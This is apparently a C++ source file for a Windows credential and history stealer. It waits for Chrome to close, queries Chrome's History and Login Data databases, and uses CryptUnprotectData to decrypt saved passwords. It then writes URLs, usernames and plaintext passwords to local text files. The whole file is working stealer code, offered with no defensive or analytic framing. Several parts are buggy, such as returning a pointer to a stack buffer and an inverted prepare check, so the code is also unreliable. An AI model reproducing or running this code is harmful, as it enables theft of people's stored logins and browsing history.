#include <Windows.h>
#include <tlhelp32.h>
#include <Wincrypt.h>
#include <tchar.h>
#include <cstdio>
#include <cstdlib>
#include <chrono>
#include <iostream>
#include <filesystem>

#include "sqlite/sqlite3.h"
#include "write.h"

#define HFILE "history.txt"
#define PFILE "passwords.txt"

//These daemons are short. After getting the history one time, it will exit
//TODO keep looking for history after first run
//TODO split historyd and passwordd into multiple files

//This is the start of the generic code (code shared between daemons)

bool check_chrome_running(){

    //init variables
    HANDLE hProcessSnap;
    HANDLE hProcess;
    PROCESSENTRY32 pe32;
    DWORD dwPriorityClass;

    //Create snapshot
    //if errors are present, assume chrome is running and don't continue
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE){
        //This probably isn't a good idea
        write_endl("Unable to detirmine if chrome is running. Waiting until next time to check.", HFILE);
        return true;
    }
    
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if ( !Process32First(hProcessSnap, &pe32)){
        write_endl("Process32First error.", HFILE);
        CloseHandle(hProcessSnap);
        return true;
    }

    //run through processes, check if any are chrome.exe
    do {
        char filename[256];

        
        if (strcmp(pe32.szExeFile, "chrome.exe") == 0){ 
            //If chrome.exe is running, return true
            return true;
        }
    }while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    //if not, return false
    return false;
}

//This is the end of the generic code, and the start of historyd specific code

inline std::filesystem::path get_hist_path(){
    const char* appdatalocal_char_ptr = std::getenv("LOCALAPPDATA");
    std::string hist_path = std::string(appdatalocal_char_ptr);
    hist_path.append("\\Google\\Chrome\\User Data\\Default\\History"); 
    return hist_path;
}

//This function is simple. It writes the history from the information that sqlite gives
int process_history(void *NotUsed, int argc, char **argv, char **azColName){
    for (short i = 0; i < argc; i++){
        write_endl(argv[i], HFILE);
    }
    
    return 0;
}

void get_history(const char* histpath){
    //Init variables for sqlite
    sqlite3 *histdb;
    char *err = 0;
    int rc;
    std::string sql;

    //I don't remember this specifics of this part
    rc = sqlite3_open(histpath, &histdb);

    if (rc){
        write_endl(sqlite3_errmsg(histdb), HFILE);
        sqlite3_close(histdb);
    }
    //SELECT url FROM urls -> get each url from the databased urls
    sql = "SELECT url FROM urls;";

    //Execute the sql command. Pass the urls to process_history
    sqlite3_exec(histdb, sql.c_str(), process_history, 0, &err);
}

void init_historyd(){
    //Initialize historyd

    std::filesystem::path historyfile = get_hist_path();
    
    write_endl(std::string("Checking for chrome installation"), HFILE);

    if (std::filesystem::exists(historyfile)) {
        //if exists

        write_endl("Installation Exists", HFILE);

        //wait until chrome stops running
        //TODO remove message, wait for a period of time after
        while(check_chrome_running()){
            write_endl("Chrome Process Running, will not continue", HFILE);
        }
        
        //The main stuff goodness is here
        get_history(std::string(historyfile).c_str());
    } 
    else {
        write_endl("No installation, killing daemon.", HFILE);
        return;
    }


}

//This is the end of the historyd specific code, and the start of the passwordd specific code

inline std::filesystem::path get_pass_path(){
    const char* appdatalocal_char_ptr = std::getenv("LOCALAPPDATA");
    std::string hist_path = std::string(appdatalocal_char_ptr);
    hist_path.append("\\Google\\Chrome\\User Data\\Default\\Login Data"); 
    return hist_path;
}

//This function decrypts the password
char * decrypt_pass(BYTE *pass){
    DATA_BLOB in;
	DATA_BLOB out;

	BYTE trick[1024];
	memcpy(trick, pass, 1024);
	int size = sizeof(trick) / sizeof(trick[0]);

	in.pbData = pass;
	in.cbData = size + 1;//we can't use strlen on a byte pointer,becouse of the NBs,so we have to be tricky dicky:)
	char str[1024] = "";

	if (CryptUnprotectData(&in, NULL, NULL, NULL, NULL, 0, &out)){
		for (int i = 0; i<out.cbData; i++)
			str[i] = out.pbData[i];
		str[out.cbData] = '\0';

		return str;
	}
	else
		return NULL; //Error on decryption
}

void get_pass(const char* histpath){
    //Init variables for sqlite
    sqlite3 *histdb;
    char *err = 0;
    int rc;
    std::string sql;
    sqlite3_stmt *stmt;

    //I don't remember this specifics of this part
    rc = sqlite3_open(histpath, &histdb);

    if (rc){
        write_endl(sqlite3_errmsg(histdb), PFILE);
        sqlite3_close(histdb);
    }
    //SELECT url FROM urls -> get each url from the databased urls
    sql = "Select action_url, username_value, password_value FROM logins;";

    //Execute the sql command. Pass the urls to process_history
    //sqlite3_exec(histdb, sql.c_str(), process_pass, 0, &err);

    

    if (sqlite3_prepare_v2(histdb, sql.c_str(), -1, &stmt, 0)){
        write_endl("Starting Passwords", PFILE);
        while (sqlite3_step(stmt) == SQLITE_ROW){
            char *url = (char *)sqlite3_column_text(stmt, 0);
            char *username = (char *)sqlite3_column_text(stmt, 1);
            BYTE *pass = (BYTE *)sqlite3_column_text(stmt, 2); // this is encrypted

            char *decpass = decrypt_pass(pass);

            //Write like this:
            // URL -> USERNAME -> PASSWORD\n
            write(url, PFILE);
            write(" -> ", PFILE);
            write(username, PFILE);
            write(" -> ", PFILE);
            write(decpass, PFILE);
            write_endl(" -> ", PFILE);
        
        }
    }else {
        write("SQLITE3 PREPARE ERROR", PFILE);
    }


}

void init_passwordd(){
    //Initialize passwordd

    std::filesystem::path passfile = get_pass_path();
    
    write_endl(std::string("Checking for chrome installation"), PFILE);

    if (std::filesystem::exists(passfile)) {
        //if exists

        write_endl("Installation Exists", PFILE);

        //wait until chrome stops running
        //TODO remove message, wait for a period of time after
        while(check_chrome_running()){
            write_endl("Chrome Process Running, will not continue", PFILE);
        }
        
        //The main stuff goodness is here
        get_pass(std::string(passfile).c_str());
    } 
    else {
        write_endl("No installation, killing daemon.", PFILE);
        return;
    }

}